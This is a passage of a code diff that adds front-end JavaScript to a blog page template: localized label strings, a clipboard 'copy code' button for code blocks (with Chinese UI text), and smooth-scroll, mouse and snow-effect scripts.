+      map.set('site-desc', "Desc: ");
+      map.set('stat', " related results, taking ");
+      map.set('stat-time', " ms");
+      map.set('site-img', "Image: ");
+    }
+
+    if (map.size > 0) {
+      let lanElems = document.querySelectorAll('.language');
+      lanElems.forEach(elem => {
+        let lan = elem.dataset.lan, text = map.get(lan);
+        if (elem.__proto__ === HTMLInputElement.prototype) {
+          elem.placeholder = text
+        } else {
+          if (elem.dataset.count) {
+            text = elem.dataset.count + text;
+          }
+          elem.textContent = text;
+        }
+      })
+    }
+  }
+  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
+  window.Clipboard = (function (window, document, navigator) {
+    var textArea,
+      copy;
+
+    // 判断是不是ios端
+    function isOS() {
+      return navigator.userAgent.match(/ipad|iphone/i);
+    }
+    //创建文本元素
+    function createTextArea(text) {
+      textArea = document.createElement('textArea');
+      textArea.value = text;
+      textArea.style.width = 0;
+      textArea.style.height = 0;
+      textArea.clientHeight = 0;
+      textArea.clientWidth = 0;
+      document.body.appendChild(textArea);
+    }
+    //选择内容
+    function selectText() {
+      var range,
+        selection;
+
+      if (isOS()) {
+        range = document.createRange();
+        range.selectNodeContents(textArea);
+        selection = window.getSelection();
+        selection.removeAllRanges();
+        selection.addRange(range);
+        textArea.setSelectionRange(0, 999999);
+      } else {
+        textArea.select();
+      }
+    }
+
+    //复制到剪贴板
+    function copyToClipboard() {
+      try {
+        document.execCommand("Copy")
+      } catch (err) {
+        alert("复制错误！请手动复制！")
+      }
+      document.body.removeChild(textArea);
+    }
+
+    copy = function (text) {
+      createTextArea(text);
+      selectText();
+      copyToClipboard();
+    };
+
+    return {
+      copy: copy
+    };
+  })(window, document, navigator);
+
+  function copyCode(e) {
+    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
+      let code = e.currentTarget.querySelector('code');
+      var text = code.innerText;
+      if (e.srcElement.textContent === '复制成功') {
+        return;
+      }
+      e.srcElement.textContent = '复制成功';
+      (function (elem) {
+        setTimeout(() => {
+          if (elem.textContent === '复制成功') {
+            elem.textContent = '复制代码'
+          }
+        }, 1000);
+      })(e.srcElement)
+      Clipboard.copy(text);
+    }
+  }
+
+  let pres = document.querySelectorAll('pre');
+  pres.forEach(pre => {
+    let code = pre.querySelector('code');
+    let copyElem = document.createElement('span');
+    copyElem.classList.add('copy-code');
+    copyElem.textContent = '复制代码';
+    pre.appendChild(copyElem);
+    pre.onclick = copyCode
+  })
+
+</script>
+<script src="/media/js/motion.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
+<script>
+  var scroll = new SmoothScroll('a[href*="#"]', {
+    speed: 200
+  });
+</script>
+
+
+<script src="/media/js/mouse/peace.js"></script>
+
+
+
+
+  <div class="snow-container"></div>
+  <script src="/media/js/bg/snow.js"></script>
+
+
 </html>
